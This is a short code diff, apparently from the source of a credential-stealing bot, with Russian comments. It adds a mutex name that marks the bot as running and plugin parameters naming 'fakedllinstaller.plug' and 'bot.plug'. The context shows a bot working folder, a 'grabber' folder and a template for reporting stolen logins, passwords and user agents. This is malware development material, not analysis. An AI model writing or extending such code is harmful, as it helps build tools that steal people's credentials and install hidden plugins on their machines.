@@ -50,6 +50,9 @@ CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
 //=============================================================================
 
 
+CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
+
+
 CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
 CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
@@ -97,6 +100,11 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 							 "Login:    %s\r\n"
 							 "Password: %s\r\n\r\n"
 							 "UserAgent: %s\r\n";
+#endif
+
+
+#ifdef HistoryAnalizerH
+	CSSTR StrHistoryAnalizerCommandParams[] = "fakedllinstaller.plug bot.plug";
 #endif
 
 
